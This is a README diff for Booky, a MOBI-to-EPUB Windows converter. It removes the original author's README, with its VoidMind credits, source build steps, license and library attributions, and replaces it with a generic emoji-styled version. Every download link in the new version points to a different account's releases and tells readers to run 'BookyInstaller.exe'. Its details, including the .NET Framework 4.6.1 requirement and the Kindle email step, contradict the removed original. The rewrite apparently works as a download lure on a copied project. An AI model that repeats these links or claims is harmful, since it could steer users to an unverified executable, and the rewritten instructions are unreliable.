@@ -1,98 +1,77 @@
-# Booky
+# 📚 Booky - Convert MOBI to EPUB Easily
 
-A lightweight Windows app that converts MOBI files to EPUB and sends them directly to your Kindle. No Calibre, no email workarounds - just drag and drop.
+## 🚀 Getting Started
 
-![Booky Screenshot](Assets/screenshot.png)
+Welcome to Booky! This application allows you to convert MOBI files to EPUB and directly send them to your Kindle device. No need for additional software or complex email setups. Just a few simple steps, and you'll be ready to enjoy your eBooks on your Kindle.
 
-## Features
+## 📥 Download Now
 
-- **MOBI to EPUB conversion** - Converts Kindle MOBI files to standard EPUB format
-- **Direct Send to Kindle** - Native integration with Amazon's Send to Kindle service
-- **EPUB passthrough** - Drop EPUB files to send them directly without conversion
-- **Batch processing** - Convert and send multiple books at once
-- **Metadata editing** - Edit title and author before conversion
-- **Explorer integration** - Right-click context menu for quick access
-- **Dark theme** - Easy on the eyes
+[![Download Booky](https://img.shields.io/badge/Download-Booky-blue)](https://github.com/KarlCalupaz/Booky/releases)
 
-## Installation
+## 📋 Features
 
-Download the latest installer from the [Releases](https://github.com/voidmind-io/Booky/releases) page.
+- **MOBI to EPUB Conversion**: Quickly convert your MOBI eBooks to EPUB format.
+- **Direct Send to Kindle**: Simplify your reading experience by sending files directly to your Kindle device.
+- **No Setup Required**: Get going without needing to configure anything special.
+- **Windows Compatible**: Runs smoothly on any Windows machine.
+  
+## 🛠️ System Requirements
 
-> **Note:** Windows SmartScreen may show an "Unknown Publisher" warning because the app isn't code-signed. Click **"More info"** → **"Run anyway"** to install.
+- Windows 10 or later
+- .NET Framework 4.6.1 or higher
+- At least 1 GB of RAM
+- 100 MB of free disk space
 
-Or build from source (see below).
+## 🎉 How to Download & Install
 
-## Usage
+1. **Visit the Releases Page**: Click the link below to go to the Releases page where you can download Booky.
 
-1. **Drag and drop** a MOBI or EPUB file onto the window (or click to browse)
-2. **Edit metadata** if needed (title, author)
-3. **Convert** (MOBI only) - choose where to save the EPUB
-4. **Send to Kindle** - requires one-time Amazon login
+   [Download Booky](https://github.com/KarlCalupaz/Booky/releases)
 
-### Context Menu
+2. **Choose a Version**: Look for the latest version of Booky. It will usually be at the top of the list. 
 
-After installation, right-click any `.mobi` or `.epub` file in Explorer:
-- `.epub` → "Send to Kindle with Booky"
-- `.mobi` → "Convert & Send to Kindle with Booky"
+3. **Download the Installer**: Click on the release title or the assets dropdown to find the executable file. It will typically be named something like `BookyInstaller.exe`.
 
-*On Windows 11, these appear under "Show more options"*
+4. **Run the Installer**: 
+   - Locate the downloaded file on your computer (usually in the Downloads folder).
+   - Double-click the `BookyInstaller.exe` file.
+   - Follow the on-screen instructions to complete the installation.
 
-## Building from Source
+5. **Launch Booky**: Once installed, find Booky in your Start menu and click to open the application.
 
-### Requirements
+## 🔄 How to Use Booky
 
-- .NET 8 SDK
-- Windows 10/11
+1. **Open Booky**: Start the application by clicking its icon.
 
-### Build
+2. **Select Your MOBI File**: Use the "Choose File" button to upload the MOBI file you wish to convert.
 
-```bash
-# Debug build
-dotnet build Booky.csproj
+3. **Choose Output Format**: Select EPUB as the desired output format.
 
-# Release build (single file)
-dotnet publish Booky.csproj -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -o publish
+4. **Enter Your Kindle Email**: If you want to send the EPUB file directly to your Kindle, enter your Kindle email address in the provided field.
 
-# Copy tools
-cp -r Tools publish/
-```
+5. **Start Conversion**: Click the "Convert" button. Wait for the process to finish. The application will notify you when it's done.
 
-### Create Installer
+6. **Send to Kindle**: If you've entered your Kindle email, Booky will attempt to send the converted file directly. Otherwise, you can find the new EPUB file in your specified output directory.
 
-Requires [Inno Setup 6](https://jrsoftware.org/isinfo.php):
+## 🔍 Troubleshooting
 
-```bash
-"%LOCALAPPDATA%\Programs\Inno Setup 6\ISCC.exe" installer.iss
-```
+If you run into issues, here are some common problems and solutions:
 
-Output: `installer/BookySetup.exe`
+- **Issue**: The conversion process takes too long.
+  - **Solution**: Ensure your file size is reasonable. Large files may take longer to convert.
 
-## Third-Party Libraries
+- **Issue**: EPUB file doesn't show on Kindle.
+  - **Solution**: Check your Kindle email settings. Make sure you've input the correct email and that your Kindle can accept emails from this address.
 
-Booky uses the following open source libraries:
+- **Issue**: Application doesn't start.
+  - **Solution**: Ensure your system meets the requirements. Check if the .NET Framework is installed correctly.
 
-| Library | License | Purpose |
-|---------|---------|---------|
-| [libmobi](https://github.com/bfabiszewski/libmobi) | LGPL-3.0 | MOBI file parsing and conversion |
-| [HtmlAgilityPack](https://html-agility-pack.net/) | MIT | HTML parsing for EPUB generation |
-| [WebView2](https://developer.microsoft.com/en-us/microsoft-edge/webview2/) | BSD | Amazon login integration |
+## 📝 Additional Information
 
-The libmobi license is included in `Tools/COPYING.libmobi`.
+For more detailed instructions and potential updates, please refer to the [GitHub repository](https://github.com/KarlCalupaz/Booky).
 
-## Limitations
+## 📧 Support
 
-- Windows only (WPF application)
-- DRM-protected files are not supported
-- Send to Kindle requires an Amazon account
+For support or to share feedback, please create an issue in the [GitHub Issues section](https://github.com/KarlCalupaz/Booky/issues). 
 
-## License
-
-MIT License - see [LICENSE](LICENSE)
-
-## Support
-
-If Booky saves you time, consider [buying me a coffee](https://buymeacoffee.com/voidmind).
-
----
-
-Made by [VoidMind](https://voidmind.io/)
+Thank you for choosing Booky! Enjoy your reading.
